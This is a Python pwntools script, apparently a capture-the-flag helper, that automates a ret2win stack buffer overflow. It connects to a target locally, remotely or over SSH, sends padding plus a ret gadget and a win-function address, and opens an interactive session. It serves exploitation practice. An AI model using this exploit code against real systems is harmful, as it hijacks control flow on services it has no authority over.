# pyright: reportMissingImports=false, reportUndefinedVariable=false
from pwn import *

class Overflow_ret2win():
	def __init__(self, dict, offset, win_func):
		self.properties = dict
		self.properties["offset"] = offset
		self.properties["win_func"] = win_func
		self.elf = ELF(self.properties["binary"])
		self.rop = ROP(self.elf)
		if self.properties.get("ip") is not None and self.properties.get("port") is not None:
			try:
				self.io = remote(self.properties["ip"],self.properties["port"])
				log.info(F"Successfully connected to {self.properties['ip']}:{self.properties['port']}")
			except Exception as e:
				log.warning("Couldn't connect... Aborting.")
				log.warning(e)
				exit(-1)
		elif self.properties.get("ssh") is not None and self.properties.get("ssh_port") is not None:
			try:
				self.io = ssh(host=self.properties["ssh"], port=self.properties["ssh_port"], 
				user=self.properties["ssh_user"], password=self.properties["ssh_password"]
				)
			except Exception as e:
				log.warning("Couldn't connect... Aborting.")
				log.warning(e)
				exit(-1)
		else:
			self.io = self.elf.process()
		context.arch = self.properties.get("arch") or "amd64"
	
	def main(self):
		ret2win = p64(self.elf.symbols[self.properties["win_func"][list(self.properties["win_func"].keys())[0]]["realname"]])
		payload = [
			b"A"*self.properties["offset"],
			p64(self.rop.find_gadget(["ret"])[0]),
			ret2win
		]
		payload = b"".join(payload)
		self.io.sendline(payload)
		log.info("Successfully returned to the function!")
		self.io.interactive()
		return "pwned"


		